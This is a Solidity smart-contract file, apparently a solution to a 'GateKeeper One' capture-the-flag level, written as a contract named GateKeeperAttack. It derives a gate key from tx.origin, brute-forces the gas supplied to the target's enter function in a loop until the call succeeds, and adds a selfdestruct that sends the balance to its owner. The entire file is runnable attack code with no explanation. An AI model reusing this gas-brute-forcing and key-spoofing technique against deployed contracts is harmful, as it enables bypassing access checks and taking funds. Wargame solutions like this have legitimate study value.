// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";

import "interfaces/gateKeeperOneInterface.sol";

contract GateKeeperAttack {
    using SafeMath for uint256;

    address payable public owner;
    address public gateKeeper;

    event GotCha(
        uint256 value
    );

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    constructor(address _address) public {
        gateKeeper = _address;
        owner = msg.sender;
    }

    function attack(uint256 offset) public onlyOwner {
        bool ret = false;
        bytes8 gateKey = bytes8(uint64(uint16(tx.origin)) + 2 ** 32);
        bytes memory encodedParams = abi.encodeWithSignature(
            ("enter(bytes8)"),
            gateKey
        );
        // brute force for gas
        for (uint256 i = 0; i < 200; i++) {
            (bool result, bytes memory data) = address(gateKeeper).call{gas: i + offset + 8191 * 3}
                (
                encodedParams
            );
            if (result) {
                emit GotCha(i);
                break;
            }
        }
    }

    function destroy() public onlyOwner {
        selfdestruct(owner);
    }
}
